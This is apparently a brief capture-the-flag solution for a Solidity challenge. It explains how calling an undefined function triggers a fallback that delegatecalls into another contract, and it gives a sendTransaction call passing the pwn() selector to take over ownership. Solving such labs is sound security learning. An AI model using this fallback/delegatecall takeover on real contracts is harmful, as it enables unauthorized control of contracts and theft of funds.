Calling a function non-existant in the contract will trigger fallback and we have passed msg.data as the function selector of pwn() and it doesnot exist on the contract and it exists on the contract which it delegates call on the fallback function. We have passed the function selector only as it has no arguments.

data => bytes4(keccak256('pwn()')) = dd365b8b

sendTransaction({from: player, to: contract.address, data: 'dd365b8b'})